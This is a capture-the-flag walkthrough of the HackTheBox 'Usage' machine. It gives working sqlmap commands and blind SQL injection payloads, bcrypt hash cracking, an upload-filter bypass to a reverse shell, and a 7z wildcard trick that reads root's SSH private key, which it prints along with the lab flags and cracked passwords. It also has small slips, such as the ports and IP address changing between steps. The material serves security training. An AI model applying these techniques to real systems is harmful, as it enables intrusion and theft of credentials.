+++ 
draft = false
date = 2024-05-29T13:07:16+01:00
title = "Usage HTB Walkthrough"
description = ""
slug = ""
authors = ["Dennis Drebitca"]
tags = [""]
categories = []
externalLink = ""
series = []
+++

![image](Scr_20.png#centre)

[comment]: <> (Insertar imagen de la carátula de la máquina)


The Usage HTB machine is a madium difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:

    - Blind SQL injection with SQLmap
    - Burpsuite
    - Hash cracking with JohnTheRipper
    - JS deobfuscation with Cyberchef
    - API enumeration


## Reconnaissance

We start a broad Nmap scan by executing the following command:

```sh
sudo nmap -sS -T5 -vvv -p- 10.10.11.18 -Pn -oG nmap_inicial
```

Where the arguments mean:

    -sS: SYN port scan
    -T5: Using timing template 5 of NMAP
    -vvv: Triple verbose so NMAP prints a lot of information
    -p-: All ports are scanned
    -Pn: Skips Host Discovery
    -oG: Grep Format

The scan returns the following information:

![image](Scr.png)

It looks like ports 20 and 80 are open. Classic open ports for SSH and https. Next, we run a more comprehensive scan on the open ports:

```sh
sudo nmap -sCV -p22,80 10.10.11.221 -oN nmap_exhaustivo -v
```

Now the arguments used mean:

    -sCV: Launches all scanning scripts to discover services and versions running on these ports
    -oN: Normal output format
    -v: Single verbose

The results for this second scan are the following:

![image](Scr_1.png)

We now need to add the IP to /etc/hosts for us to follow the redirect to http://usage.htb/

The tool whatweb shows us the following information:

![image](Scr_2.png)

The server is ubuntu running NGINX, as well as the Laravel web framework.

The landing page shows a http form, asking to log in, register or admin. The admin page is also a login page.

![image](Scr_5.png)

The usual SSH and HTTP ports are open. Now lets try to enumerate subdirectories via brute force with WFUZZ

```sh
sudo wfuzz -c -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 http://usage.htb/FUZZ 
```

It looks like there is some kind of WAF that is blocking the fuzzing. We will come back later to fuzzing if there is no low hanging fruit.

There is a password recovery page, and when a ' is typed, the server crashes. It looks like something is going on here: SQL injection. 

![image](Scr_3.png)

Lets use SQLmap to exploit the SQL injection. First, we need to use Burp Suite to take a look at the request to know how to proceed.

```sql
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://usage.htb
Connection: close
Referer: http://usage.htb/forget-password
Cookie: XSRF-TOKEN=eyJpdiI6InhycjdFU1pySnhWV25yRSttLzloYXc9PSIsInZhbHVlIjoiSElncjJLVzNVYUYyak1Ta2xublludHcyRU1vNFpXNmNOV3c3U0lxTFB4T3JzVVZuYUZ1ZWNCblRobFhVdG01NjJuV29ZeGduR2Y1S3FkMExqZzNwR1VWamk1ZVBDcmxlM2VyaWFiRHllOXpwMlpKaFIvYnNId0YyOGkrWUM2cVEiLCJtYWMiOiI2MjQxNDAzZGYxYWE4YTViNjc5N2I0MmRkYjdjMWNkZmQ4MWU0ZDQ3ZTNiZjNmM2EyYzdlOGQxYTI5MmMzODZiIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImIrelhhN1Z4Y2RFY050SllhUlh4dUE9PSIsInZhbHVlIjoiakZlMTV6Uytpd1NITGNZTDI3bFRyYUlScVBqMndnd1hzdUJVb2hjenk2eDdkaHhhNkR0Vy9QanVEVmU4M3VtVGhaUkNwZy9RbkEzYzk0S2cySzg1SHRRUm1EN3NNdm9YS3lmd3A0MDhrdVhRTzc2RjdVdzJDdGEyODNIUlVaa3QiLCJtYWMiOiIzNWJiYjhhZTZkMjFmNzgxMDI4ZDllOWFjZjVkNjQ4MGJiOWNlOTk2ODhmMmMxY2ZhNjBjMThiMGQ4MDQ3MTRmIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1

_token=2qPJeYFy7moaJgUQeWWsCgA96zN1P3nUCFlKzT5D&email=test

```

It is a POST request, not a GET request. The parameter we have to exploit is "email". Now, we can build the command:

```sh
sqlmap -r request.txt -p email --batch --level 5 --risk 3 --dbms=mysql --dbs
```

We specify the request, the parameter to be injected, the type of database used and enumerate the databases, so we can extract them one by one.


```sh
┌──(kali㉿kali)-[~/…/share/sqlmap/output/usage.htb]
└─$ cat log       
sqlmap identified the following injection point(s) with a total of 721 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=2qPJeYFy7moaJgUQeWWsCgA96zN1P3nUCFlKzT5D&email=test' AND 5093=(SELECT (CASE WHEN (5093=5093) THEN 5093 ELSE (SELECT 2481 UNION SELECT 1892) END))-- -

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=2qPJeYFy7moaJgUQeWWsCgA96zN1P3nUCFlKzT5D&email=test' AND 6545=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- OjGy
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL > 5.0.12
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
```

The most interesting DB is usage_blog, so lets try and extract it using SQLmap and its blind time-based injection.


```sh
sqlmap -r request.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D usage_blog --dump --threads=10
```

As this is a time-based injection, it is highly advised to use the --threads argument in order to speed up the process. After a while, the table *admin_users* is dumped. Here we can see the hash of the admin account:

```sh
id,name,avatar,password,username,createa_at,updated_at,remember_token
1,Administrator,<blank>,$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2,admin,<blank>,2023-07-23 06:02:19,kThXIKu7GhLpgwStz7fCFxiC[bAQQ?\x11?PpxwEkzv1Sdzva0qLYaDhllwrsLT
```

Another set of data is interesting:

```sh
retrieved: {"name":"Administrator","password":"$2y$10$E9.N1P92fYSjJGQDfBrUaO05EHV4BuiQIAciAMA?!M   mA2%A?H?K","password_confirmation":"$2y$10$E9.N1P92fYSjJGQDeBrUaJ))ABA!1a?  ?  )a !!A? ?    i1A?? ??    11!?!?Q?? ?a?  zpIB8ykA2Ya@d1?i????9xUdwBSS02","_method":"PUT"}

````

This second hash seems to be corrupted during the dumping of the database. Using JohnTheRipper, we can crack the first hash with the following command:

```sh
john --wordlist=/home/kali/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
```

And here is the result and the cracked password:

```sh
┌──(kali㉿kali)-[~/maquinas/Usage]
└─$ john --wordlist=/home/kali/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)     
1g 0:00:00:09 DONE (2024-05-30 11:20) 0.1096g/s 177.6p/s 177.6c/s 177.6C/s alexis1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

And now, we can log in to the admin Laravel page:


![image](Scr_4.png)


## Initial access

Exploring the admin dashboard, we come across a site that allows for a photo upload. It is possible we could upload a php reverse shwll, so lets try it.

![image](Scr_6.png)

It would be to good to be true: the website does not allow to upload a non-image file. Lets try and trick it.

![image](Scr_7.png)

Lets try and trick it by modifying the extension. 

![image](Scr_8.png)

It does not execute it. As a last resort, lets open BurpSuite and intercept the upload request.

![image](Scr_9.png)

Changing the extension on the request worked. We now have a revershe shell on the machine. 

![image](Scr_11.png)

However, i decided to spawn another bash one just in case something goes wrong with the php shell.

![image](Scr_12.png)

Now as user dash, we can retrieve the user flag.

```sh
dash@usage:~$ cat user.txt
b38b591cfc8e60e5bf8f1bd7ddb9bb13
```

However, this user can't do anything relevant. Lets see if there are other users that we can gain access to.



## Lateral movement

Searching the files, we discover one that contains the a password. It actually is the password for user xander.

![image](Scr_13.png)


The password is: 

```sh
3nc0d3d_pa$$w0rd
```


## Privilege escalation

Running linpeas under the user xander, we have some interesting information:

![image](Scr_14.png)

![image](Scr_15.png)

We can see that user xander can run /usr/bin/usage_management with root privileges. Lets take a look and see what this does:

![image](Scr_17.png)

It looks like it creates a .zip backup of the "project". Lets take a look at the binary and see what does it contain. Since it is a precompiled binary, ad not a script, we would have to use ghydra to decompile it. First, lets see if the strings present in the binary are useful:

```sh
strings /usr/bin/usage_management
```

![image](Scr_16.png)

There is a interesting string: 

```sh
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

This command is susceptible to a trick called "wildcard spare". The command invokes 7z with a wildcard, "\*" , and we can exploit it using [this guide on HachTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks).

Citing directly from HackTricks: "In 7z even using -- before * (note that -- means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file"

In my case, I want to read the SSH private key of root. Following the HackTricks steps:
```sh
cd /var/www/html
touch @id_rsa
ln -s /root/.ssh/id_rsa id_rsa
sudo /usr/bin/usage_management
```

![image](Scr_18.png)


We get the private key. Now we can use it to log in as root and get the root flag:


```sh
echo '-----BEGIN OPENSSH PRIVATE KEY-----                                                  
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----' > id_rsa

chmod 600 id_rsa
ssh -i id_rsa root@usage.htb
```

![image](Scr_19.png)

And rooted!

## Conclusion

Hacking through the Usage HTB machine provides valuable insights into penetration testing techniques, including enumeration, vulnerability exploitation, and privilege escalation. By understanding these steps, aspiring ethical hackers like me can enhance their skills and contribute positively to the cybersecurity landscape.
